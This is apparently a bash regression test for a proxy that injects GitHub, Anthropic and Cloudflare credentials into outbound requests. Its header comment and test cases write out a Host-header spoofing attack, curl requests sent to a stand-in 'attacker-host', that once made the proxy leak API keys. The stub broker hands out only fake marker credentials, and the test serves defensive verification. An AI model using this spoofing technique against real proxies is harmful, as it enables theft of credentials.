#!/usr/bin/env bash
# Credential-injection addons (010_github, 020_anthropic, 030_cloudflare).
#
# These fetch a real secret from the broker and add it to the outbound request.
# The host check therefore decides who receives the credential, which makes it
# the highest-consequence branch in the whole stack: match too loosely and the
# proxy mails the key to whoever asked.
#
# REGRESSION under test: the addons matched flow.request.pretty_host, which
# prefers the client-supplied Host header while mitmproxy connects to
# flow.request.host. A dev container could therefore run
#
#   curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/
#
# and the addon would inject the Anthropic key into a request delivered to
# my-server. Verified against the real addon before the fix: it reached
# _get_cred() and only failed because the stub broker returns text, not JSON.
#
# A stub broker stands in for the real one and hands out obviously fake
# credentials, so a leak shows up as a marker string rather than a real key.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/../lib.sh"
cd "$REPO_ROOT"

require_docker
IMG="sat-test-proxy"
build_image "$IMG" stack/proxy || exit 1

MARKER="LEAKED-CREDENTIAL-MARKER"

# Echo server: reflects the request headers so a test can see exactly what the
# proxy sent, and to whom.
ECHO_CONF="$RUN_ID-echo.conf"
cat > "/tmp/$ECHO_CONF" <<EOF
server {
  listen 8080;
  location / {
    default_type text/plain;
    return 200 "RECEIVED-BY=\$host AUTH=\$http_authorization XAPIKEY=\$http_x_api_key TOKEN=\$http_authorization\n";
  }
}
EOF

# Broker stub: returns fake credentials in the shape each provider expects.
BROKER_CONF="$RUN_ID-broker.conf"
cat > "/tmp/$BROKER_CONF" <<EOF
server {
  listen 8080;
  default_type application/json;
  location = /github/token      { return 200 '{"token":"$MARKER"}'; }
  location = /anthropic/cred    { return 200 '{"type":"api_key","value":"$MARKER"}'; }
  location = /anthropic/key     { return 200 '{"key":"$MARKER"}'; }
  location = /cloudflare/token  { return 200 '{"token":"$MARKER"}'; }
  location / { return 404 '{"error":"no such provider route"}'; }
}
EOF

net_up
curl_up

BK="$RUN_ID-brokerstub"
docker run -d --name "$BK" --network "$NET" --network-alias broker \
  -v "/tmp/$BROKER_CONF:/etc/nginx/conf.d/default.conf:ro" nginx:alpine >/dev/null
track_container "$BK"

# The echo server answers to the vendor hostnames (so legitimate injection can
# be observed) and to `attacker-host` (the exfiltration target).
EC="$RUN_ID-echo"
docker run -d --name "$EC" --network "$NET" \
  --network-alias api.github.com --network-alias api.anthropic.com \
  --network-alias api.cloudflare.com --network-alias attacker-host \
  -v "/tmp/$ECHO_CONF:/etc/nginx/conf.d/default.conf:ro" nginx:alpine >/dev/null
track_container "$EC"

wait_http "$BK:8080/github/token" 200 "broker stub"

run_proxy() { # run_proxy <name> <addon-file>...
  local name="$RUN_ID-$1"; shift
  local dir="/tmp/$name-addons"
  mkdir -p "$dir"
  cp stack/proxy/addons/000_policy.py "$dir/"
  local a; for a in "$@"; do cp "$a" "$dir/"; done
  docker run -d --name "$name" --network "$NET" -v "$dir:/addons:ro" \
    -e BROKER_URL=http://broker:8080 -e PYTHONUNBUFFERED=1 "$IMG" >/dev/null
  track_container "$name"
  local i
  for i in $(seq 1 60); do
    [ "$(http_code "http://attacker-host:8080/x" --proxy "http://$name:8080")" = "200" ] && return 0
    sleep 0.5
  done
  return 1
}

ADDONS=examples/claude-code/proxy/addons
DC_ADDONS=examples/dev-container/.devcontainer/proxy/addons

# ------------------------------------------------------------------ anthropic

suite "020_anthropic.py"
if run_proxy anthropic "$ADDONS/020_anthropic.py"; then
  P="--proxy http://$RUN_ID-anthropic:8080"

  body=$(http_body "http://api.anthropic.com:8080/v1/messages" $P)
  check_contains "credential injected for the real vendor host" "$body" "$MARKER"

  # The attack: real destination is attacker-host, Host header claims the vendor.
  body=$(http_body "http://attacker-host:8080/v1/messages" -H "Host: api.anthropic.com" $P)
  check_not_contains "spoofed Host does NOT leak the credential" "$body" "$MARKER"
  check_contains "request still reached the attacker host (no credential)" "$body" "RECEIVED-BY="

  body=$(http_body "http://attacker-host:8080/v1/messages" $P)
  check_not_contains "unrelated host gets no credential" "$body" "$MARKER"

  # Admin API stays blocked on the genuine host.
  check "Admin API blocked" "403" \
    "$(http_code "http://api.anthropic.com:8080/v1/organizations/api_keys" $P)"
  check "Admin API block cannot be dodged with a spoofed Host" "403" \
    "$(http_code "http://api.anthropic.com:8080/v1/organizations/api_keys" -H "Host: attacker-host" $P)"
else
  ko "anthropic proxy did not start" "$(docker logs "$RUN_ID-anthropic" 2>&1 | tail -20)"
fi

# --------------------------------------------------------------------- github

suite "010_github.py"
if run_proxy github "$ADDONS/010_github.py"; then
  P="--proxy http://$RUN_ID-github:8080"

  body=$(http_body "http://api.github.com:8080/rate_limit" $P)
  check_contains "token injected for api.github.com" "$body" "$MARKER"

  body=$(http_body "http://attacker-host:8080/rate_limit" -H "Host: api.github.com" $P)
  check_not_contains "spoofed Host does NOT leak the token" "$body" "$MARKER"

  # Documented invariant: github.com itself must not be matched — git push/pull
  # authenticates through the credential helper instead.
  body=$(http_body "http://attacker-host:8080/x" -H "Host: github.com" $P)
  check_not_contains "github.com is not a matched host" "$body" "$MARKER"
else
  ko "github proxy did not start" "$(docker logs "$RUN_ID-github" 2>&1 | tail -20)"
fi

# ----------------------------------------------------------------- cloudflare

suite "030_cloudflare.py"
if run_proxy cloudflare "$DC_ADDONS/030_cloudflare.py"; then
  P="--proxy http://$RUN_ID-cloudflare:8080"

  body=$(http_body "http://api.cloudflare.com:8080/client/v4/user" $P)
  check_contains "token injected for api.cloudflare.com" "$body" "$MARKER"

  body=$(http_body "http://attacker-host:8080/client/v4/user" -H "Host: api.cloudflare.com" $P)
  check_not_contains "spoofed Host does NOT leak the token" "$body" "$MARKER"
else
  ko "cloudflare proxy did not start" "$(docker logs "$RUN_ID-cloudflare" 2>&1 | tail -20)"
fi

rm -f "/tmp/$ECHO_CONF" "/tmp/$BROKER_CONF"
rm -rf "/tmp/$RUN_ID"-*-addons

finish
